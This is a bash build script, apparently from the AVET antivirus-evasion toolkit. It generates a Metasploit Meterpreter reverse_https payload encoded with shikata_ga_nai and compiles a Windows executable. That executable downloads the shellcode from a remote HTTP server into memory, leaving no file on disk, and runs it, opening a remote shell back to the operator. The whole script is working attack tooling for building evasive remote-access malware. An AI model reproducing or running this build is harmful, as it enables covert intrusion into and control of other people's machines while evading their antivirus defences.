#!/bin/bash          
# Download the shellcode via sockets.

# The generated msf payload needs to be hosted on a HTTP server
# Call your executable like:
# output.exe http://yourserver/thepayload.bin
# The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload, encoded with shikata_ga_nai
# create payload in /var/www/html
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source download_socket

# set decoder and key source
set_decoder none
set_key_source none

# set payload info source
set_payload_info_source none

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# enable debug output
enable_debug_print

# compile to pwn.exe file
$win32_compiler -o output/output.exe source/avet.c -lwsock32 -lWs2_32
strip output/output.exe

# cleanup
cleanup_techniques

# The generated msf payload needs to be hosted on a HTTP server
# Call your executable like:
# output.exe http://yourserver/thepayload.bin
# The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.
